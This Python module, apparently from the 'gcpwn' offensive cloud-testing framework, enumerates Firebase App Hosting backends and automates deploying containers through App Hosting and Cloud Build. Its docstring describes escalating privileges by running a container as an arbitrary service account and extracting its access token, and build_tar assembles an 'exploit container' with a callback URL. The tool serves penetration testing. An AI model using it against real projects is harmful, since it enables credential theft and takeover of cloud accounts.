from __future__ import annotations

import time

import requests as _rlib

from gcpwn.core.resource import GcpListResource
from gcpwn.core.utils.action_recording import record_permissions
from gcpwn.core.utils.iam_permissions import permissions_with_prefixes
from gcpwn.core.utils.module_helpers import (
    extract_project_id_from_resource,
    get_bearer_token,
    static_locations,
)

_FAH_BASE = "https://firebaseapphosting.googleapis.com/v1beta"
_CB_BASE = "https://cloudbuild.googleapis.com/v1"
_GCS_BASE = "https://storage.googleapis.com"
_CR_BASE = "https://run.googleapis.com/v2"

_FAH_LOCATIONS = static_locations("firebaseapphosting")
_FAH_DEFAULT_LOCATIONS = ["us-central1", "us-east1", "us-west1", "europe-west1"]


def resolve_fah_locations(session, args):
    if getattr(args, "location", None):
        return [args.location]
    if getattr(args, "all_locations", False):
        return _FAH_LOCATIONS
    return _FAH_DEFAULT_LOCATIONS


def _normalize_backend(b: dict) -> dict:
    return {
        "name": b.get("name", ""),
        "state": b.get("state", ""),
        "service_account": b.get("serviceAccount", ""),
        "uri": b.get("uri", ""),
    }


class FirebaseAppHostingBackendResource(GcpListResource):
    """List Firebase App Hosting backends via REST.

    Backends with a ``serviceAccount`` field are PE candidates: an attacker
    with ``firebaseapphosting.backends.create + iam.serviceAccounts.actAs``
    can deploy a container running as an arbitrary SA and extract a ya29.*
    token from the Cloud Run metadata server.
    """

    SERVICE_LABEL = "Firebase App Hosting"
    TABLE_NAME = "firebase_backends"
    COLUMNS = ["project_id", "location", "backend_id", "name", "state", "service_account", "uri"]
    ACTION_RESOURCE_TYPE = "backends"
    LIST_PERMISSION = "firebaseapphosting.backends.list"
    TEST_IAM_PERMISSIONS = tuple(permissions_with_prefixes("firebaseapphosting.backends."))
    ID_FIELD = "backend_id"
    PARENT_FROM_PROJECT_LOCATION = True

    def _build_client(self, session):
        return None  # REST-only

    def list(self, *, project_id=None, location=None, parent=None, action_dict=None, **_):
        tok = get_bearer_token(self.session)
        url = f"{_FAH_BASE}/projects/{project_id}/locations/{location}/backends"
        results = []
        page_token = None
        while True:
            params: dict = {"pageSize": 100}
            if page_token:
                params["pageToken"] = page_token
            resp = _rlib.get(url, headers={"Authorization": f"Bearer {tok}"}, params=params, timeout=20)
            if resp.status_code != 200:
                try:
                    msg = (resp.json().get("error", {}).get("message") or "").lower()
                    if any(k in msg for k in ("api not enabled", "disabled", "has not been used")):
                        return "Not Enabled"
                except Exception:
                    pass
                return None
            data = resp.json()
            results.extend(data.get("backends", []))
            page_token = data.get("nextPageToken")
            if not page_token:
                break
        rows = [_normalize_backend(b) for b in results]
        record_permissions(
            action_dict,
            permissions=self.LIST_PERMISSION,
            scope_key="project_permissions",
            scope_label=project_id,
        )
        return rows

    def test_iam_permissions(self, *, resource_id: str, action_dict=None) -> list[str]:
        if not self.TEST_IAM_PERMISSIONS:
            return []
        tok = get_bearer_token(self.session)
        try:
            resp = _rlib.post(
                f"{_FAH_BASE}/{resource_id}:testIamPermissions",
                headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
                json={"permissions": list(self.TEST_IAM_PERMISSIONS)},
                timeout=15,
            )
            if resp.status_code == 200:
                granted = resp.json().get("permissions", [])
                if granted:
                    record_permissions(
                        action_dict,
                        permissions=granted,
                        project_id=extract_project_id_from_resource(
                            resource_id, fallback_project=self._fallback_project()
                        ),
                        resource_type=self.ACTION_RESOURCE_TYPE,
                        resource_label=resource_id,
                    )
                return granted
        except Exception:
            pass
        return []

    def create(self, project_id: str, location: str, body: dict) -> dict:
        """Create a Firebase App Hosting backend. Returns the response dict.

        Pass ``backendId`` in body to set the backend ID (moved to a query param).
        """
        tok = get_bearer_token(self.session)
        payload = dict(body)
        backend_id = payload.pop("backendId", None)
        params = {"backendId": backend_id} if backend_id else {}
        r = _rlib.post(
            f"{_FAH_BASE}/projects/{project_id}/locations/{location}/backends",
            params=params,
            headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
            json=payload,
            timeout=30,
        )
        return r.json()

    def create_build(self, backend_name: str, body: dict) -> dict:
        """Create a Firebase App Hosting build and poll until READY.

        ``backend_name`` is the full backend resource path
        (``projects/<p>/locations/<l>/backends/<id>``).
        Pass ``buildId`` in body to set the build ID (moved to a query param).
        Returns the final state dict.
        """
        tok = get_bearer_token(self.session)
        payload = dict(body)
        build_id = payload.pop("buildId", None)
        params = {"buildId": build_id} if build_id else {}
        r = _rlib.post(
            f"{_FAH_BASE}/{backend_name}/builds",
            params=params,
            headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
            json=payload,
            timeout=30,
        )
        data = r.json()
        if "error" in data:
            return data
        if not build_id:
            resp_name = data.get("name", "")
            build_id = resp_name.rsplit("/", 1)[-1] if "/" in resp_name else ""
        if not build_id:
            return data
        deadline = time.time() + 300
        while time.time() < deadline:
            time.sleep(10)
            tok = get_bearer_token(self.session)
            br = _rlib.get(
                f"{_FAH_BASE}/{backend_name}/builds/{build_id}",
                headers={"Authorization": f"Bearer {tok}"},
                timeout=15,
            )
            state = br.json().get("state", "?")
            print(f"    [fah-build] {state}", flush=True)
            if state in ("READY", "BUILT"):
                return br.json()
            if state in ("FAILED", "SKIPPED"):
                return br.json()
        return {"state": "TIMEOUT"}

    def create_rollout(self, backend_name: str, body: dict) -> dict:
        """Create a Firebase App Hosting rollout and poll until SUCCEEDED.

        ``backend_name`` is the full backend resource path.
        Pass ``rolloutId`` in body to set the rollout ID (moved to a query param).
        Returns the final state dict.
        """
        tok = get_bearer_token(self.session)
        payload = dict(body)
        rollout_id = payload.pop("rolloutId", None)
        params = {"rolloutId": rollout_id} if rollout_id else {}
        r = _rlib.post(
            f"{_FAH_BASE}/{backend_name}/rollouts",
            params=params,
            headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
            json=payload,
            timeout=30,
        )
        data = r.json()
        if "error" in data:
            return data
        if not rollout_id:
            resp_name = data.get("name", "")
            rollout_id = resp_name.rsplit("/", 1)[-1] if "/" in resp_name else ""
        if not rollout_id:
            return data
        deadline = time.time() + 300
        while time.time() < deadline:
            time.sleep(10)
            tok = get_bearer_token(self.session)
            rr = _rlib.get(
                f"{_FAH_BASE}/{backend_name}/rollouts/{rollout_id}",
                headers={"Authorization": f"Bearer {tok}"},
                timeout=15,
            )
            state = rr.json().get("state", "?")
            print(f"    [rollout] {state}", flush=True)
            if state == "SUCCEEDED":
                return rr.json()
            if state in ("FAILED", "CANCELLED"):
                return rr.json()
        return {"state": "TIMEOUT"}

    def delete(self, backend_name: str) -> None:
        """Delete a Firebase App Hosting backend.

        ``backend_name`` is the full backend resource path.
        """
        tok = get_bearer_token(self.session)
        r = _rlib.delete(
            f"{_FAH_BASE}/{backend_name}",
            params={"force": "true"},
            headers={"Authorization": f"Bearer {tok}"},
            timeout=15,
        )
        if r.status_code in (200, 202, 204):
            print("  [+] Backend deletion requested")
        else:
            print(f"  [!] Could not delete backend: {r.status_code}")


    def ensure_bucket(self, project_id: str, bucket_name: str, location: str) -> str | None:
        """Create a GCS bucket if it doesn't exist. Returns None on success, error string on failure."""
        tok = get_bearer_token(self.session)
        r = _rlib.post(
            f"{_GCS_BASE}/storage/v1/b",
            params={"project": project_id},
            headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
            json={"name": bucket_name, "location": location or "US", "storageClass": "STANDARD"},
            timeout=20,
        )
        if r.status_code in (200, 409):
            return None
        return f"Bucket create failed {r.status_code}: {r.text[:200]}"

    def upload_source(self, bucket_name: str, blob_name: str, content: bytes) -> str | None:
        """Upload bytes to a GCS object. Returns None on success, error string on failure."""
        tok = get_bearer_token(self.session)
        r = _rlib.post(
            f"{_GCS_BASE}/upload/storage/v1/b/{bucket_name}/o",
            params={"uploadType": "media", "name": blob_name},
            headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/gzip"},
            data=content,
            timeout=30,
        )
        if r.status_code == 200:
            return None
        return f"GCS upload failed {r.status_code}: {r.text[:200]}"

    def run_cloud_build(self, project_id: str, build_config: dict) -> str:
        """Submit a Cloud Build job and poll to completion. Returns built image URI. Raises RuntimeError on failure."""
        tok = get_bearer_token(self.session)
        r = _rlib.post(
            f"{_CB_BASE}/projects/{project_id}/builds",
            headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
            json=build_config,
            timeout=30,
        )
        data = r.json()
        if "error" in data:
            raise RuntimeError(f"Cloud Build create failed: {data['error'].get('message', str(data['error']))}")
        build_id = data.get("metadata", {}).get("build", {}).get("id")
        if not build_id:
            raise RuntimeError("Could not find Cloud Build ID in response")
        print(f"  [+] Cloud Build started: {build_id}", flush=True)
        deadline = time.time() + 600
        while time.time() < deadline:
            time.sleep(15)
            tok = get_bearer_token(self.session)
            sr = _rlib.get(
                f"{_CB_BASE}/projects/{project_id}/builds/{build_id}",
                headers={"Authorization": f"Bearer {tok}"},
                timeout=15,
            )
            status = sr.json().get("status", "?")
            print(f"    [cb] {status}", flush=True)
            if status == "SUCCESS":
                images = sr.json().get("results", {}).get("images", [])
                if images:
                    name = images[0].get("name", "")
                    digest = images[0].get("digest", "")
                    return f"{name}@{digest}" if digest else name
                return ""
            if status in ("FAILURE", "CANCELLED", "TIMEOUT", "EXPIRED"):
                raise RuntimeError(f"Cloud Build {status}")
        raise RuntimeError("Cloud Build timed out")

    def get_cloud_run_url(self, project_id: str, location: str, service_id: str) -> str:
        """Return the public URI of a Cloud Run service."""
        tok = get_bearer_token(self.session)
        r = _rlib.get(
            f"{_CR_BASE}/projects/{project_id}/locations/{location}/services/{service_id}",
            headers={"Authorization": f"Bearer {tok}"},
            timeout=15,
        )
        return r.json().get("uri", "")

    def ensure_ar_repo(self, project_id: str, location: str, ar_repo_uri: str) -> None:
        """Create an Artifact Registry Docker repo if it does not exist."""
        repo_id = ar_repo_uri.split("/")[-1]
        tok = get_bearer_token(self.session)
        url = f"https://artifactregistry.googleapis.com/v1/projects/{project_id}/locations/{location}/repositories"
        resp = _rlib.get(
            url,
            headers={"Authorization": f"Bearer {tok}"},
            params={"filter": f'name="{location}-docker.pkg.dev/{project_id}/{repo_id}"'},
            timeout=20,
        )
        repos = (resp.json().get("repositories") or []) if resp.ok else []
        if any(r.get("name", "").endswith(f"/{repo_id}") for r in repos):
            return
        body = {"format": "DOCKER", "description": "gcpwn Firebase App Hosting staging"}
        create_resp = _rlib.post(
            url,
            headers={"Authorization": f"Bearer {tok}", "Content-Type": "application/json"},
            json=body,
            params={"repositoryId": repo_id},
            timeout=30,
        )
        if create_resp.status_code in (200, 201):
            print(f"  [+] Created AR repo: {ar_repo_uri}")
        elif create_resp.status_code == 409:
            pass
        else:
            print(f"  [!] AR repo create returned {create_resp.status_code}: {create_resp.text[:200]}")
            print(f"      Run manually: gcloud artifacts repositories create {repo_id} "
                  f"--repository-format=docker --location={location} --project={project_id}")

    @staticmethod
    def build_tar(callback_url: str, main_py_template: str, dockerfile: bytes, trigger_path: str = "/") -> bytes:
        """Build a .tar.gz containing Dockerfile + main.py for the exploit container."""
        import io, tarfile
        main_py = main_py_template.format(callback_url=callback_url, trigger_path=trigger_path).encode()
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tar:
            for name, content in [("Dockerfile", dockerfile), ("main.py", main_py)]:
                info = tarfile.TarInfo(name=name)
                info.size = len(content)
                tar.addfile(info, io.BytesIO(content))
        return buf.getvalue()
